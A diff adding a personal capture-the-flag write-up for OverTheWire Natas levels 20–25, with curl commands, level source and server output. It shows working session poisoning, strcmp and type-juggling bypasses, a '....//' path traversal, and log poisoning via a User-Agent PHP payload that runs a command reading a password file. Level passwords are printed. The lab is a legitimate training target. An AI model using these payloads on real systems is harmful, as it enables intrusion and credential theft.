@@ -1483,10 +1483,387 @@ Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
 ```
 
 # Level 20 -> 21:
+
+```
+abs@MacBookPro OverTheWire % curl "natas21.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH                                                        
+...
+<h1>natas21</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?>
+```
+
+Let's try bew other site:
+```
+abs@MacBookPro OverTheWire % curl "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH                                                        
+<h1>natas21 - CSS style experimenter</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
+</p>
+[DEBUG] Session contents:<br>Array
+(
+)
+
+<p>Example:</p>
+<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
+<p>Change example values here:</p>
+<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+And the new index-source.html:
+```
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists("debug", $_GET)) {
+    print "[DEBUG] Session contents:<br>";
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+$form .= '<input type="submit" name="submit" value="Update" />';
+$form .= '</form>';
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
+$example = "<div style='$style'>Hello world!</div>";
+
+?>
+
+<p>Example:</p>
+<?=$example?>
+
+<p>Change example values here:</p>
+<?=$form?>
+```
+
+So, I want to set the session using the "natas21-experimenter" site, and the re-use it in the regular one...
+```
+abs@MacBookPro OverTheWire % curl "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -d "name=hiii & submit=yo & admin=1" -i
+Set-Cookie: PHPSESSID=8f054i5uko362idrks99b9m9va; path=/; HttpOnly
+...
+[DEBUG] Session contents:<br>Array
+(
+    [debug] => 1
+    [name] => hiii 
+    [submit] => yo 
+    [admin] => 1
+)
+```
+
+```
+abs@MacBookPro OverTheWire % curl "natas21.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -i -H "Cookie: PHPSESSID=8f054i5uko362idrks99b9m9va"
+...
+You are an admin. The credentials for the next level are:<br><pre>Username: natas22
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
+```
+
 # Level 21 -> 22:
+abs@MacBookPro OverTheWire % curl "http://natas22.natas.labs.overthewire.org//index.php?debug=1" -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz -s -i
+...
+Set-Cookie: PHPSESSID=uplh9o1b02h8ndcibva41ipcsv; path=/; HttpOnly
+...
+<h1>natas22</h1>
+<div id="content">
+...
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+Very useful..
+
+index-source.html:
+```
+<?php
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+
+...
+
+<?php
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+```
+
+So if the "revelio" key exists, we will get the password printed, but we'd also redirect.
+
+I'm using curl and won't follow redirects anyway"
+```
+abs@MacBookPro OverTheWire % curl "http://natas22.natas.labs.overthewire.org//index.php?revelio=1" -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz -s -i
+HTTP/1.1 302 Found <---- Redirct
+...
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
+```
+
 # Level 22 -> 23:
+```
+abs@MacBookPro OverTheWire % curl "http://natas23.natas.labs.overthewire.org//index.php" -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs -s -i
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+```
+
+So from one hand, passwd should contain the "iloveyou" string, and from the other, the numeric value should be greater than 10:
+```
+abs@MacBookPro OverTheWire % curl "http://natas23.natas.labs.overthewire.org//index.php" -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs -s -d "passwd=99iloveyou & submit="
+...
+<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
 # Level 23 -> 24:
+```
+abs@MacBookPro OverTheWire % curl "http://natas24.natas.labs.overthewire.org//index.php" -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd -s
+...
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+```
+
+I can't bruteforce the password that is ~x^32, and I can't guess the password either, so I need to make the strcmp to fail.
+
+If it fails, I get NULL and !NULL will be true.
+
+Everything in the GET request is in a string form, but I can change the type of passwd to be an array:
+```
+abs@MacBookPro OverTheWire % curl "http://natas24.natas.labs.overthewire.org//index.php?debug=1" -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd -s -d "passwd[]=comeonn & submit=" -i
+...
+<br />
+<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+
 # Level 24 -> 25:
+```
+abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s                                     
+...
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+    
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+        
+        closedir($handle);
+        return $listoffiles;
+    } 
+    
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php  
+    session_start();
+    setLanguage();
+    
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
+<p>
+```
+
+Let's create a session with easy ID - "art-vandelay", which will also create the logfile `logs/natas25_art-vandelay.log`.
+
+```
+abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay"
+<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe,
+...
+```
+
+The language is under "/var/www/natas/natas25/language/" and so does the logs "/var/www/natas/natas25/logs".
+
+So by doing: "../logs/natas25_art-vandelay.log", the from "language" (like in the safeinclude()), I should be able to find the log file.
+
+Because I cant use ../, I'll use the good-old ....//, which will be replaced to ../ in runtime:
+```
+abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php?lang=....//logs/natas25_art-vandelay.log" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay"
+[25.09.2025 12::12:48] curl/8.7.1 "Directory traversal attempt! fixing request."
+<br />
+<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+<h2></h2><br />
+<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+<p align="justify"><br />
+<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
+```
+
+It worked! I can see the logs that happended when it replaced my ....// to ../ !
+
+Now, because I cant read the natas_webpass, I need to dump it's content to my log somehow.
+
+Notice that in the logFile function, it will write the user-agent head, as is, to the logs file. If it was a php code, when it dumps it, it would've been exeuted!
+
+
+
+```
+abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php?lang=....//logs/natas25_art-vandelay.log" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay" -A '<?php system("cat /etc/natas_webpass/natas26"); ?>'
+...
+[25.09.2025 12::12:48] curl/8.7.1 "Directory traversal attempt! fixing request."
+[25.09.2025 12::13:27] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+ "Directory traversal attempt! fixing request."
+```
+
 # Level 25 -> 26:
 # Level 26 -> 27:
 # Level 27 -> 28:
